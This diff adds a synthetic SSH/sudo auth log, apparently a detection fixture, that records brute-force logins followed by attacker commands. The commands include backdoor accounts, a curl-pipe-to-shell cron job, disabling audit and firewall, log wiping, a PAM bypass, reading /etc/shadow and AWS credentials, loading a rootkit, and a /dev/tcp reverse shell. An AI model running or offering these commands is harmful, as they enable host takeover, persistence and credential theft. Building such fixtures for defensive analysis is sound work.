@@ -1,0 +1,51 @@
+2026-11-10T02:00:01.101000+00:00 web01 sshd[2211]: Invalid user admin from 45.155.205.233 port 51422
+2026-11-10T02:00:01.102000+00:00 web01 sshd[2211]: Failed password for invalid user admin from 45.155.205.233 port 51422 ssh2
+2026-11-10T02:00:20.204000+00:00 web01 sshd[2212]: Invalid user test from 45.155.205.233 port 51424
+2026-11-10T02:00:20.205000+00:00 web01 sshd[2212]: Failed password for invalid user test from 45.155.205.233 port 51424 ssh2
+2026-11-10T02:00:40.307000+00:00 web01 sshd[2213]: Invalid user oracle from 45.155.205.233 port 51426
+2026-11-10T02:00:40.308000+00:00 web01 sshd[2213]: Failed password for invalid user oracle from 45.155.205.233 port 51426 ssh2
+2026-11-10T02:01:00.411000+00:00 web01 sshd[2214]: Invalid user postgres from 45.155.205.233 port 51428
+2026-11-10T02:01:00.412000+00:00 web01 sshd[2214]: Failed password for invalid user postgres from 45.155.205.233 port 51428 ssh2
+2026-11-10T02:01:20.515000+00:00 web01 sshd[2215]: Invalid user ubuntu from 45.155.205.233 port 51430
+2026-11-10T02:01:20.516000+00:00 web01 sshd[2215]: Failed password for invalid user ubuntu from 45.155.205.233 port 51430 ssh2
+2026-11-10T02:01:40.619000+00:00 web01 sshd[2216]: Invalid user pi from 45.155.205.233 port 51432
+2026-11-10T02:01:40.620000+00:00 web01 sshd[2216]: Failed password for invalid user pi from 45.155.205.233 port 51432 ssh2
+2026-11-10T02:02:00.723000+00:00 web01 sshd[2217]: Invalid user deploy from 45.155.205.233 port 51434
+2026-11-10T02:02:00.724000+00:00 web01 sshd[2217]: Failed password for invalid user deploy from 45.155.205.233 port 51434 ssh2
+2026-11-10T02:20:10.111000+00:00 web01 sshd[2251]: Failed password for root from 91.240.118.172 port 40222 ssh2
+2026-11-10T02:20:20.112000+00:00 web01 sshd[2252]: Failed password for root from 91.240.118.172 port 40224 ssh2
+2026-11-10T02:20:30.113000+00:00 web01 sshd[2253]: Failed password for root from 91.240.118.172 port 40226 ssh2
+2026-11-10T02:20:40.114000+00:00 web01 sshd[2254]: Failed password for root from 91.240.118.172 port 40228 ssh2
+2026-11-10T02:21:10.115000+00:00 web01 sshd[2255]: Failed password for root from 185.220.101.47 port 38812 ssh2
+2026-11-10T02:21:20.116000+00:00 web01 sshd[2256]: Failed password for root from 185.220.101.47 port 38814 ssh2
+2026-11-10T02:21:30.117000+00:00 web01 sshd[2257]: Failed password for root from 185.220.101.47 port 38816 ssh2
+2026-11-10T02:21:40.118000+00:00 web01 sshd[2258]: Failed password for root from 185.220.101.47 port 38818 ssh2
+2026-11-10T02:22:10.119000+00:00 web01 sshd[2259]: Failed password for root from 193.32.162.91 port 51102 ssh2
+2026-11-10T02:22:20.120000+00:00 web01 sshd[2260]: Failed password for root from 193.32.162.91 port 51104 ssh2
+2026-11-10T02:22:30.121000+00:00 web01 sshd[2261]: Failed password for root from 193.32.162.91 port 51106 ssh2
+2026-11-10T02:22:40.122000+00:00 web01 sshd[2262]: Failed password for root from 193.32.162.91 port 51108 ssh2
+2026-11-10T02:30:14.330000+00:00 web01 sshd[2399]: Accepted password for deploy from 91.240.118.172 port 44322 ssh2
+2026-11-10T02:30:14.331000+00:00 web01 sshd[2399]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+2026-11-10T02:40:02.440000+00:00 web01 sshd[2420]: Accepted password for root from 45.155.205.233 port 51502 ssh2
+2026-11-10T02:40:02.441000+00:00 web01 sshd[2420]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+2026-11-10T02:45:02.551000+00:00 web01 useradd[2501]: new user: name=svc-backup, UID=1002, GID=1002, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/0
+2026-11-10T02:47:11.662000+00:00 web01 usermod[2510]: add 'svc-backup' to group 'sudo'
+2026-11-10T02:48:03.773000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c 'echo "svc-backup ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/svc-backup'
+2026-11-10T02:49:02.884000+00:00 web01 su[2520]: Successful su for root by deploy
+2026-11-10T02:50:01.995000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c id
+2026-11-10T02:52:33.106000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c 'mkdir -p /home/svc-backup/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKq7 attacker@example" >> /home/svc-backup/.ssh/authorized_keys'
+2026-11-10T02:55:12.217000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c 'echo "* * * * * curl -s http://185.220.101.47/x.sh | sh" > /etc/cron.d/updater'
+2026-11-10T02:57:22.328000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl enable --now argus-updater.service
+2026-11-10T02:58:05.439000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl enable argus-sync.timer
+2026-11-10T02:59:02.550000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl stop auditd
+2026-11-10T03:00:11.661000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/ufw disable
+2026-11-10T03:02:24.772000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log
+2026-11-10T03:03:41.883000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sed -i s/pam_unix.so/pam_permit.so/ /etc/pam.d/common-auth
+2026-11-10T03:04:12.994000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c 'unset HISTFILE; rm -f /home/deploy/.bash_history'
+2026-11-10T03:05:33.105000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+2026-11-10T03:06:44.216000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /home/deploy/.aws/credentials
+2026-11-10T03:07:55.327000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/chmod u+s /tmp/.cache/updater
+2026-11-10T03:08:06.438000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/sbin/insmod /tmp/rootkit.ko
+2026-11-10T03:09:17.549000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get install -y netcat-openbsd
+2026-11-10T03:10:28.650000+00:00 web01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1'
+2026-11-10T03:55:01.760000+00:00 web01 sshd[2399]: pam_unix(sshd:session): session closed for user deploy
